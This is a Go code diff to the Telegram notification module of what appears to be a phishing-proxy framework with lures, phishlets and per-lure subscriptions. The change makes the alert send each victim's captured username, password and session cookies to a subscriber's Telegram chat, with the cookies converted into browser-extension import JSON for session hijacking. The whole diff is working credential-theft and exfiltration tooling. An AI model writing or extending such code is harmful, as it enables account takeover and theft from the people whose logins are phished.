@@ -1,6 +1,7 @@
 package core
 
 import (
+	"encoding/json"
 	"fmt"
 	_log "log"
 	"io"
@@ -870,18 +871,13 @@ func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []stri
 
 // NotifySession sends a live session alert to the subscriber's notify chat.
 // Called from the http_proxy OnResponse handler when credentials are captured.
-func NotifySession(lureId int, phishlet, username, password, remoteAddr string, hasTokens bool) {
+func NotifySession(lureId int, phishlet, username, password, remoteAddr string, hasTokens bool, cookieTokens map[string]map[string]*database.CookieToken, updateTime int64) {
 	if GlobalBot == nil {
 		return
 	}
 	sub, err := GlobalBot.db.GetSubscriptionByLureId(lureId)
 	if err != nil || sub.NotifyChatId == 0 {
 		return
-	}
-
-	tokenStatus := "⚪ no tokens yet"
-	if hasTokens {
-		tokenStatus = "🟢 *session tokens captured!*"
 	}
 
 	uname := username
@@ -893,14 +889,46 @@ func NotifySession(lureId int, phishlet, username, password, remoteAddr string, 
 		pass = "—"
 	}
 
+	sessionVal := "N/A"
+
+	// build browser-extension cookie JSON
+	type browserCookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly"`
+	}
+	defaultExpiry := updateTime + 2592000
+	var cookies []browserCookie
+	for domain, tokenMap := range cookieTokens {
+		for _, ct := range tokenMap {
+			expiry := ct.ExpiresAt
+			if expiry == 0 {
+				expiry = defaultExpiry
+			}
+			cookies = append(cookies, browserCookie{
+				Path:           ct.Path,
+				Domain:         domain,
+				ExpirationDate: expiry,
+				Value:          ct.Value,
+				Name:           ct.Name,
+				HttpOnly:       ct.HttpOnly,
+			})
+		}
+	}
+
+	cookieJSON := "[]"
+	if len(cookies) > 0 {
+		if b, err2 := json.MarshalIndent(cookies, "", "    "); err2 == nil {
+			cookieJSON = string(b)
+		}
+	}
+
 	msg := fmt.Sprintf(
-		"🎯 *New Session — %s*\n\n"+
-			"👤 Username: `%s`\n"+
-			"🔑 Password: `%s`\n"+
-			"🌐 IP: `%s`\n"+
-			"%s\n\n"+
-			"Use /logs to see all sessions.",
-		tgEscape(phishlet), tgEscape(uname), tgEscape(pass), tgEscape(remoteAddr), tokenStatus)
+		"Username: %s\nPassword: %s\nSession: %s\n\nINFO.TXT\n\nConverted JSON:\n%s",
+		uname, pass, sessionVal, cookieJSON)
 
 	GlobalBot.send(sub.NotifyChatId, msg)
 }
